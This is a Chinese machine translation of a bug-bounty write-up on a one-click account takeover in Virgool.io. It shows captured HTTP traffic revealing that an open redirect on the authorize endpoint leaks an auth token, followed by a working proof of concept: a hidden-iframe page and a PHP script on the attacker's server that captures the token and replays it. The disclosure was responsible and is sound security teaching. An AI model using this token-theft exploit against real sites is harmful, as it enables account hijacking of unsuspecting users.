# Virgool.io 的一键式账户接管——一个很好的案例研究

> 原文：<https://infosecwriteups.com/1-click-account-takeover-in-virgool-io-a-nice-case-study-6bfc3cb98ef2?source=collection_archive---------0----------------------->

你好， [Virgool](https://virgool.io/) 是一个轻量级的，伊朗版的 meduim.com，最近我在他们的产品中发现了一次点击账户接管漏洞。

![](img/80db8e94c0f010e3fa170cc43184e401.png)

Virgool 为用户提供了域名停放的能力。所以`site.com`可以是`virgool.io/myname`的一面镜子。我在看 Virgool 上主办的[https://tech . cafe bazaar . IR](https://tech.cafebazaar.ir)。我看到了源代码，最吸引眼球的部分是登录链接:

```
[https://virgool.io/authorize?redirectedFrom=https://tech.cafebazaar.ir&amp;status=login](https://virgool.io/authorize?redirectedFrom=https://tech.cafebazaar.ir&status=login)
```

我点击了一下，登录了 Virgool，然后我再次被重定向到了[https://tech . cafe bazaar . IR](https://tech.cafebazaar.ir)。让我们看看流程:

从[https://tech . cafe bazaar . IR](https://tech.cafebazaar.ir)页面点击登录:

```
GET /authorize?**redirectedFrom=**[**https://tech.cafebazaar.ir&status=login**](https://tech.cafebazaar.ir&status=login) HTTP/1.1
Host: virgool.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: [https://tech.cafebazaar.ir/](https://tech.cafebazaar.ir/)
Connection: close
Cookie: PHPSESSID=REDUCTED; rec=REDUCTED; XSRF-TOKEN=REDUCTED; vrgl_sess=REDUCTED; _ga=GA1.2.1769807866.1561463323; _gid=GA1.2.215640833.1561463323; _vcfg=%7B%22tpcs_c%22%3A49%7D; nightmode={%22value%22:0%2C%22userMenu%22:0%2C%22active%22:0}; __cfduid=daf3ea276c68e9eb2200e84f71f8b3ea61561463882; _gat_UA-96394274-1=1
Upgrade-Insecure-Requests: 1
```

回应是:

```
HTTP/1.1 302 Found
Server: nginx/1.15.9
Date: Wed, 26 Jun 2019 05:45:35 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: Virgool
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
**Location:** [**https://virgool.io/login**](https://virgool.io/login)
Set-Cookie: XSRF-TOKEN=REDUCTED; expires=Thu, 27-Jun-2019 05:45:35 GMT; Max-Age=86400; path=/
Set-Cookie: vrgl_sess=REDUCTED; expires=Thu, 27-Jun-2019 05:45:35 GMT; Max-Age=86400; path=/; httponly
X-Frame-Options: sameorigin
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self' files.virgool.io blob:; connect-src 'self' [https://www.google-analytics.com](https://www.google-analytics.com) stats.vstat.ir heapanalytics.com cdn.iframe.ly [https://geoip-db.com](https://geoip-db.com); font-src 'self' data: [https://virgool.io](https://virgool.io);  img-src blob: data: https: 'self' files.virgool.io [https://www.google-analytics.com](https://www.google-analytics.com); object-src 'self' virgool.io; media-src cdn.virgool.io; script-src 'self' blob: [https://virgool.io](https://virgool.io) 'unsafe-eval' 'unsafe-inline' [www.googletagmanager.com](http://www.googletagmanager.com) [https://www.google-analytics.com](https://www.google-analytics.com) js-agent.newrelic.com stats.vstat.ir bam.eu01.nr-data.net heapanalytics.com cdn.iframe.ly [https://cdn.iframe.ly](https://cdn.iframe.ly) [https://geoip-db.com](https://geoip-db.com)  https: 'self'; style-src 'unsafe-inline' data: https: 'self'; frame-src 'self' cdn.iframe.ly [https://cdn.iframe.ly](https://cdn.iframe.ly)  chromenull: https: webviewprogressproxy: ; worker-src blob: 'self'; 
Strict-Transport-Security: max-age=15724800; includeSubDomains
Content-Length: 5830
```

提交凭据后的登录页面:

```
POST /api/v1.2/login HTTP/1.1
Host: virgool.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: [https://virgool.io/login](https://virgool.io/login)
X-XSRF-TOKEN: REDUCTED
Content-Type: multipart/form-data; boundary=---------------------------1803676204095613341172964359
Content-Length: 319
Connection: close
Cookie: PHPSESSID=REDUCTED; rec=REDUCTED; XSRF-TOKEN=REDUCTED%3D%3D; vrgl_sess=REDUCTED; _ga=GA1.2.1769807866.1561463323; _gid=GA1.2.215640833.1561463323; _vcfg=%7B%22tpcs_c%22%3A49%7D; nightmode={%22value%22:0%2C%22userMenu%22:0%2C%22active%22:0}; __cfduid=daf3ea276c68e9eb2200e84f71f8b3ea61561463882; _gat_UA-96394274-1=1-----------------------------1803676204095613341172964359
Content-Disposition: form-data; name="username"[y.shahinzadeh@gmail.com](mailto:y.shahinzadeh@gmail.com)
-----------------------------1803676204095613341172964359
Content-Disposition: form-data; name="password"REDUCTED
-----------------------------1803676204095613341172964359--
```

回应是:

```
HTTP/1.1 200 OK
Server: nginx/1.15.9
Date: Wed, 26 Jun 2019 05:45:55 GMT
Content-Type: application/json
Connection: close
Vary: Accept-Encoding
X-Powered-By: Virgool
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 861
Set-Cookie: auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.REDUCTED; expires=Wed, 25-Mar-2020 23:45:55 GMT; Max-Age=23652000; path=/
Set-Cookie: jwts=REDUCTED; expires=Wed, 25-Mar-2020 23:45:55 GMT; Max-Age=23652000; path=/; secure; httponly
Set-Cookie: refreshed_token=REDUCTED; expires=Wed, 26-Jun-2019 06:05:55 GMT; Max-Age=1200; path=/; secure
Set-Cookie: uid=sb5uevdkih3r; expires=Wed, 25-Mar-2020 23:45:55 GMT; Max-Age=23652000; path=/
Set-Cookie: vrgl_sess=REDUCTED; expires=Thu, 27-Jun-2019 05:45:55 GMT; Max-Age=86400; path=/; httponly
X-Frame-Options: sameorigin
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self' files.virgool.io blob:; connect-src 'self' [https://www.google-analytics.com](https://www.google-analytics.com) stats.vstat.ir heapanalytics.com cdn.iframe.ly [https://geoip-db.com](https://geoip-db.com); font-src 'self' data: [https://virgool.io](https://virgool.io);  img-src blob: data: https: 'self' files.virgool.io [https://www.google-analytics.com](https://www.google-analytics.com); object-src 'self' virgool.io; media-src cdn.virgool.io; script-src 'self' blob: [https://virgool.io](https://virgool.io) 'unsafe-eval' 'unsafe-inline' [www.googletagmanager.com](http://www.googletagmanager.com) [https://www.google-analytics.com](https://www.google-analytics.com) js-agent.newrelic.com stats.vstat.ir bam.eu01.nr-data.net heapanalytics.com cdn.iframe.ly [https://cdn.iframe.ly](https://cdn.iframe.ly) [https://geoip-db.com](https://geoip-db.com)  https: 'self'; style-src 'unsafe-inline' data: https: 'self'; frame-src 'self' cdn.iframe.ly [https://cdn.iframe.ly](https://cdn.iframe.ly)  chromenull: https: webviewprogressproxy: ; worker-src blob: 'self'; 
Strict-Transport-Security: max-age=15724800; includeSubDomains
Content-Length: 612{"success":true,"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.REDUCTED.juAVldUazb6ZTMCopRaXzWQGh-6EYnxXjUd8uEK5jDA","previous_url":"**https:\/\/virgool.io\/authorize?redirectedFrom=https:\/\/tech.cafebazaar.ir&status=checked**","user":{"name":"YShahinzadeh","activated":1,"username":"YShahinzadeh","avatar":"https:\/\/files.virgool.io\/upload\/users\/9091\/avatar\/1xRXC6.png"}}
```

这里没什么有用的。操纵登录链接的想法([https://virgool.io/authorize?redirected from = https://tech . cafe bazaar . IR&amp；status=login](https://virgool.io/authorize?redirectedFrom=https://tech.cafebazaar.ir&status=login) )不够有趣，因为:

```
[https://virgool.io/authorize?redirectedFrom=https://test.com&status=login](https://virgool.io/authorize?redirectedFrom=https://tech.cafebazaar.ir&status=login)
```

用户登录后会有一个无用的打开重定向(老实说我没查过这个向量，我不确定登录顺序后的打开重定向)。这里我测试了一个攻击场景:

> 如果用户已经登录，点击授权链接会怎样？

其机制是:

```
GET /authorize?redirectedFrom=[http://tech.cafebazaar.ir&status=login](http://tech.cafebazaar.ir&status=login) HTTP/1.1
Host: virgool.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: REDUCTED
Upgrade-Insecure-Requests: 1
```

反应令人惊讶:

```
HTTP/1.1 302 Found
Server: nginx/1.15.9
Date: Wed, 26 Jun 2019 08:34:53 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: Virgool
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
**Location:** [**http://tech.cafebazaar.ir/authorize-token?token=sa5uevekit3r&redirectedFrom=http://tech.cafebazaar.ir&nightmode={**](http://tech.cafebazaar.ir/authorize-token?token=sb5uevdkih3r&redirectedFrom=http://tech.cafebazaar.ir&nightmode={)**"value":0,"userMenu":0,"active":0}**
Set-Cookie: XSRF-TOKEN=REDUCTED; expires=Thu, 27-Jun-2019 08:34:53 GMT; Max-Age=86400; path=/
Set-Cookie: vrgl_sess=REDUCTED; expires=Thu, 27-Jun-2019 08:34:53 GMT; Max-Age=86400; path=/; httponly
X-Frame-Options: sameorigin
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self' files.virgool.io blob:; connect-src 'self' [https://www.google-analytics.com](https://www.google-analytics.com) stats.vstat.ir heapanalytics.com cdn.iframe.ly [https://geoip-db.com](https://geoip-db.com); font-src 'self' data: [https://virgool.io](https://virgool.io);  img-src blob: data: https: 'self' files.virgool.io [https://www.google-analytics.com](https://www.google-analytics.com); object-src 'self' virgool.io; media-src cdn.virgool.io; script-src 'self' blob: [https://virgool.io](https://virgool.io) 'unsafe-eval' 'unsafe-inline' [www.googletagmanager.com](http://www.googletagmanager.com) [https://www.google-analytics.com](https://www.google-analytics.com) js-agent.newrelic.com stats.vstat.ir bam.eu01.nr-data.net heapanalytics.com cdn.iframe.ly [https://cdn.iframe.ly](https://cdn.iframe.ly) [https://geoip-db.com](https://geoip-db.com)  https: 'self'; style-src 'unsafe-inline' data: https: 'self'; frame-src 'self' cdn.iframe.ly [https://cdn.iframe.ly](https://cdn.iframe.ly)  chromenull: https: webviewprogressproxy: ; worker-src blob: 'self'; 
Strict-Transport-Security: max-age=15724800; includeSubDomains
Content-Length: 6482
```

等等，没有任何登录页面，只有一个令牌来刷新身份验证(更新 JWT 令牌)。如果我能偷到代币，我会接管任何账户。怎么可能呢？通过开放重定向:)

第一枪成功了:

```
GET /authorize?redirectedFrom=[http://localhost/&status=login](http://localhost/&status=login) HTTP/1.1
Host: virgool.io
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
...
```

回应是:

```
HTTP/1.1 302 Found
Server: nginx/1.15.9
Date: Wed, 26 Jun 2019 08:42:40 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: Virgool
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Cache-Control: no-cache, private
**Location:** [**http://localhost/authorize-token?token=sb5uevdkih3r&redirectedFrom=http://localhost/&nightmode={**](http://localhost/authorize-token?token=sb5uevdkih3r&redirectedFrom=http://localhost/&nightmode={)**"value":0,"userMenu":0,"active":0}**
...
```

完成，1-lick 帐户接管。以下是漏洞利用代码:

```
<style>
iframe {
    visibility: hidden;
    position: absolute;
    left: 0; top: 0;
    height:0; width:0;
    border: none;
}</style><center><img src="troll.jpg"></center><iframe src="[**https://virgool.io/authorize?redirectedFrom=http://localhost/v/g.php&status=login**](https://virgool.io/authorize?redirectedFrom=http://localhost/v/g.php&status=login)"></iframe>
```

在攻击者的盒子里:

```
<?phpfile_put_contents('hacked.html', '<html><meta content="text/html;charset=utf-8" http-equiv="Content-Type">
<meta content="utf-8" http-equiv="encoding"><script>document.location=\'[http://virgool.io/authorize-token?token='](http://virgool.io/authorize-token?token=') . $_GET['token'] . '&redirectedFrom=[https://virgool.io&nightmode={](https://virgool.io&nightmode={)"value":0,"userMenu":0,"active":0}\'</script>');?>
```

一旦用户访问了攻击者的网站，攻击者应该诱骗用户访问他们的网站:

```
**GET /authorize-token?token=**[**sa5uevekit3r**](http://tech.cafebazaar.ir/authorize-token?token=sb5uevdkih3r&redirectedFrom=http://tech.cafebazaar.ir&nightmode={)**&redirectedFrom=**[**http://localhost/v/g.php&nightmode={%22value%22:0,%22userMenu%22:0,%22active%22:0**](http://localhost/v/g.php&nightmode={%22value%22:0,%22userMenu%22:0,%22active%22:0)**}** HTTP/1.1
**Host: localhost**
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: [http://localhost/v/](http://localhost/v/)
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

他们将令牌发送给攻击者，他们的 Virgool 帐户就被攻破了。在这里，我应该感谢 Virgool 的快速反应和慷慨。以下是发送给 Virgool 的 POC 视频: